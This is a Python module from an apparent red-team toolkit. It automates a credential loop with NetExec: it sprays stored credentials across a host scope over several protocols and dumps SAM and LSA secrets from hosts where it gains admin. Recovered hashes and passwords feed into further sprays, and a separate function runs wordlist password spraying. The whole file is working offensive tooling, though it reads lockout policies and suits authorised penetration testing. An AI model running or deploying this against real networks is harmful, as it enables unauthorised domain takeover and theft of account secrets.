"""The credential loop — spray, parse, loot, repeat until dry.

This is the spine of the engine::

    known creds ─▶ spray across scope ─▶ parse (Pwn3d!) ─▶ dump admin hosts
         ▲                                                        │
         └──────────────── promote recovered secrets ◀───────────┘

Each round sprays only the credentials not yet tried (a credential recovered from a
dump is sprayed next round), so the loop converges instead of re-running everything,
and stops when a full round adds no new access and no new credential.

**Lockout safety.** The loop reuses each account's *own* proven secret against the
scope — a correct password never increments the bad-password counter, so credential
reuse cannot lock a domain account. The domain password policy is still read up front
(``--pass-pol``) and surfaced, because it is the input a *guessing* spray needs and
because a local-auth credential reused where that local account differs is the one
case that can bite. The loop never guesses; it validates and pivots.

The subprocess runner is injected (``run=``) so the whole loop is testable against
canned nxc output without a packet.
"""
from dataclasses import dataclass, field

from . import runner as runner_mod
from .creds import Credential, render_nxc
from .dump import parse_dump
from .ingest import apply_nxc, classify_nxc
from .netexec import parse_pass_policy

#: Backstop so a misbehaving loop cannot spray forever; real convergence is much
#: faster (creds recovered per round shrink fast).
MAX_ROUNDS = 12

#: Protocols nxc can spray/validate that fieldkit renders auth for.
PROTOCOLS = ("smb", "winrm", "ssh", "rdp", "mssql", "ldap", "ftp")


@dataclass
class SprayReport:
    """What one ``spray`` invocation did — for the operator summary and tests."""

    proto: str = "smb"
    rounds: int = 0
    creds_sprayed: int = 0
    valid: int = 0
    admin: int = 0
    hosts_looted: int = 0
    creds_recovered: int = 0
    policy: object = None            # PassPolicy or None
    policy_note: str = None
    aborted: str = None              # set when the loop could not run (e.g. nxc missing)
    events: list = field(default_factory=list)


def _emit(report, on_event, message):
    report.events.append(message)
    if on_event:
        on_event(message)


def _targets_arg(ips):
    """nxc takes many targets on the command line; pass them as-is (space-separated).

    A file would scale better for a /16, but keeping targets in the argv keeps the
    captured command self-describing — you can see exactly what was hit."""
    return list(ips)


def read_policy(store, cred, run, *, dc_ip=None):
    """Read the domain password policy from a DC before spraying. Returns
    ``(PassPolicy | None, note)``."""
    dc = dc_ip
    if dc is None:
        dcs = [h for h in store.hosts() if h["is_dc"]]
        dc = (dcs[0]["ip"] if dcs else None)
    if dc is None:
        hosts = store.hosts()
        dc = hosts[0]["ip"] if hosts else None
    if dc is None:
        return None, "no host to read a policy from"
    rendered = render_nxc(cred, "smb", target=dc, extra=["--pass-pol"])
    result = run(rendered.argv, rendered.env)
    if not result.ok:
        return None, result.error or "policy read failed"
    policy = parse_pass_policy(result.output)
    if policy is None:
        return None, f"{dc} returned no readable policy"
    return policy, None


def _spray_one(store, cred_row, ips, proto, run, source, report, on_event):
    """Spray one stored credential across the scope; record what it proves."""
    cred = Credential.from_row(cred_row)
    rendered = render_nxc(cred, proto, extra=["--continue-on-success"])
    # render_nxc puts the target right after the proto; splice the host list in there.
    argv = rendered.argv[:2] + _targets_arg(ips) + rendered.argv[2:]
    result = run(argv, rendered.env)
    if not result.ok:
        report.aborted = result.error
        return False
    before = store.counts()
    apply_nxc(store, classify_nxc(result.output), source=source)
    after = store.counts()
    gained_admin = after["admin_access"] - before["admin_access"]
    new_valid = after["access"] - before["access"]
    report.valid += new_valid
    report.admin += gained_admin
    if new_valid or gained_admin:
        _emit(report, on_event,
              f"  {cred.principal}: +{new_valid} valid"
              + (f", +{gained_admin} admin" if gained_admin else ""))
    return True


def _loot_host(store, host_row, run, report, on_event):
    """Dump SAM+LSA on an owned host and promote what the loop can reuse."""
    cred_row = store.admin_credential_for(host_row["id"])
    if cred_row is None:
        return 0
    cred = Credential.from_row(cred_row)
    rendered = render_nxc(cred, "smb", target=host_row["ip"], extra=["--sam", "--lsa"])
    result = run(rendered.argv, rendered.env)
    if not result.ok:
        _emit(report, on_event, f"  loot {host_row['ip']}: {result.error}")
        return 0
    recovered = 0
    with store.transaction():
        for entry in parse_dump(result.output):
            store.add_loot(host_row["id"], entry.kind, value=entry.raw)
            if entry.promotable:
                _, created = store.add_credential(entry.credential, source=entry.section)
                recovered += created
    if recovered:
        _emit(report, on_event, f"  loot {host_row['ip']}: +{recovered} credentials")
    return recovered


def spray_loop(store, config, *, proto="smb", subnet=None, run=None, loot=True,
               with_policy=True, dc_ip=None, timeout=600, source="spray", on_event=None):
    """Run the credential loop over the scope. Returns a :class:`SprayReport`.

    ``run`` defaults to the real subprocess runner; tests inject a fake that maps an
    argv to canned nxc output.
    """
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env, timeout=timeout))
    report = SprayReport(proto=proto)

    hosts = store.hosts(subnet=subnet)
    ips = [h["ip"] for h in hosts]
    if not ips:
        report.aborted = "no hosts in scope" + (f" for {subnet}" if subnet else "")
        return report
    if not store.credentials():
        report.aborted = "no credentials to spray — add one first"
        return report

    if with_policy:
        first = store.credentials()[0]
        policy, note = read_policy(store, Credential.from_row(first), run, dc_ip=dc_ip)
        report.policy, report.policy_note = policy, note
        if policy is not None:
            _emit(report, on_event,
                  f"policy {policy.domain or ''}: lockout "
                  + (f"{policy.threshold}/{policy.reset_minutes}min "
                     f"→ reuse is safe, {policy.safe_attempts} guesses/window"
                     if policy.has_lockout else "disabled"))
        elif note:
            _emit(report, on_event, f"policy: unread ({note}) — reuse spray is still safe")

    sprayed = set()
    looted = set()
    for rnd in range(1, MAX_ROUNDS + 1):
        todo = [c for c in store.credentials() if c["id"] not in sprayed]
        if not todo:
            break
        report.rounds = rnd
        _emit(report, on_event,
              f"round {rnd}: spraying {len(todo)} credential(s) over {len(ips)} host(s) [{proto}]")
        for cred_row in todo:
            sprayed.add(cred_row["id"])
            report.creds_sprayed += 1
            if not _spray_one(store, cred_row, ips, proto, run, source, report, on_event):
                return report  # runner failed (e.g. nxc not installed) — stop cleanly

        if loot and proto == "smb":
            for host in store.admin_hosts():
                if host["id"] in looted:
                    continue
                looted.add(host["id"])
                report.hosts_looted += 1
                report.creds_recovered += _loot_host(store, host, run, report, on_event)

    return report


# --------------------------------------------------------------- wordlist spray
# Different threat model from stored-cred spray:
#
#   * stored-cred spray reuses each account's own *proven* secret -> impossible
#     to lock an account by construction;
#   * wordlist spray tries user × password combinations -> WILL lock accounts if
#     the domain has a lockout policy and the operator does not respect it.
#
# fieldkit reads the lockout policy first (same read_policy() as stored spray)
# and refuses to run beyond `safe_attempts` combinations per window unless the
# operator explicitly acknowledges the risk (`allow_lockout_risk=True`).

import os


@dataclass
class WordlistReport:
    """One wordlist-spray invocation."""

    proto: str = "smb"
    userlist: str = None
    passlist: str = None
    combinations: int = 0
    valid: int = 0
    admin: int = 0
    creds_added: int = 0
    hosts_added: int = 0
    access_added: int = 0
    aborted: str = None
    policy: object = None
    policy_note: str = None


def _count_lines(path):
    n = 0
    with open(path, "r", errors="replace") as fh:
        for line in fh:
            if line.strip() and not line.startswith("#"):
                n += 1
    return n


def wordlist_spray(store, config, *, proto="smb", subnet=None, userlist=None,
                   passlist=None, run=None, timeout=1800, source="wordlist-spray",
                   dc_ip=None, allow_lockout_risk=False, continue_on_success=True,
                   on_event=None):
    """Wordlist × password spray via nxc: ``-u <userlist> -p <passlist>``.

    Only recovered credentials land in the store — a raw wordlist does not
    pollute state. Refuses to run when the lockout policy would trip unless
    ``allow_lockout_risk=True`` (deliberate operator opt-in — the risk is a
    locked domain account).
    """
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env,
                                                       timeout=timeout))
    rep = WordlistReport(proto=proto, userlist=userlist, passlist=passlist)

    userlist = userlist or config.get("userlist")
    passlist = passlist or config.get("passlist")
    if not userlist or not passlist:
        rep.aborted = ("wordlist spray needs both a userlist and a passlist "
                       "— pass --userlist/--passlist or `config set userlist=… "
                       "passlist=…`")
        return rep
    if not os.path.exists(userlist):
        rep.aborted = f"userlist not found: {userlist}"
        return rep
    if not os.path.exists(passlist):
        rep.aborted = f"passlist not found: {passlist}"
        return rep
    rep.userlist, rep.passlist = userlist, passlist
    rep.combinations = _count_lines(userlist) * _count_lines(passlist)

    hosts = store.hosts(subnet=subnet)
    ips = [h["ip"] for h in hosts]
    if not ips:
        rep.aborted = ("no hosts in the engagement"
                       + (f" for {subnet}" if subnet else ""))
        return rep

    # Read policy up front. If we know the policy and the run would exceed
    # safe_attempts per user, refuse unless the operator opted in.
    if store.credentials():
        first = store.credentials()[0]
        policy, note = read_policy(store, Credential.from_row(first), run, dc_ip=dc_ip)
        rep.policy, rep.policy_note = policy, note
        if policy is not None and policy.has_lockout:
            per_user_attempts = _count_lines(passlist)
            if per_user_attempts > policy.safe_attempts and not allow_lockout_risk:
                rep.aborted = (
                    f"lockout policy: {policy.threshold}/{policy.reset_minutes}min "
                    f"— {per_user_attempts} passwords per user exceeds "
                    f"{policy.safe_attempts} safe attempts/window. Pass "
                    "`--allow-lockout-risk` to run anyway (you accept the risk "
                    "of locking accounts), or trim the passlist.")
                return rep
    else:
        rep.policy_note = "no stored credentials — cannot read lockout policy first"

    if on_event:
        on_event(f"wordlist spray {proto}: {rep.combinations} combos across "
                 f"{len(ips)} host(s)  users={userlist}  passwords={passlist}")

    argv = ["nxc", proto] + ips + ["-u", userlist, "-p", passlist]
    if continue_on_success:
        argv += ["--continue-on-success"]
    if config.get("domain"):
        argv += ["-d", config["domain"]]

    result = run(argv, None)
    if result.error:
        rep.aborted = result.error
        return rep

    intent = classify_nxc(result.output or "")
    ingest_rep = apply_nxc(store, intent, source=source)
    rep.valid = len(intent.creds)
    rep.admin = sum(1 for _c, r in intent.creds if r.admin)
    rep.creds_added = ingest_rep.creds_added
    rep.hosts_added = ingest_rep.hosts_added
    rep.access_added = ingest_rep.access_added
    if on_event:
        on_event(f"wordlist spray: {rep.valid} valid, {rep.admin} admin, "
                 f"{rep.creds_added} new credentials")
    return rep
